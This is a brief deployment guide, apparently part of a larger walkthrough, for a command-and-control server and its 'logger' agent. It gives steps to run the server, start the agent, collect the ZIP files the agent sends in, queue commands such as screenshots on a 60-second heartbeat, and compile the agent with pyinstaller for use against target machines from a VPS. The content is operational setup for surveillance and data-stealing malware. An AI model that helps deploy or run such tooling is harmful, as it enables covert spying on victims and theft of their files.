# C2 Server Deployment

## 1. Start the Server

Navigate to the `server` directory and run:

```bash
cd server
pip install -r requirements.txt
python server.py
```

It will start on port `5000`. You can access the dashboard at `http://127.0.0.1:5000`.

## 2. Start the Agent

Navigate back to the root and run the logger (ensure `main.py` is pointing to `http://127.0.0.1:5000`):

```bash
python main.py
```

## 3. Control

- **Dashboard**: Go to `http://127.0.0.1:5000`.
- **View Files**: Received ZIPs will appear in the list.
- **Send Commands**: Click buttons like "Create Screenshot" to queue a command. The Agent will pick it up on its next heartbeat (every 60s by default).

## Compilation

Follow the standard `pyinstaller` guide in the main walkthrough to compile `main.py`. The server script must be run as a standard Python script on your VPS/Machine.
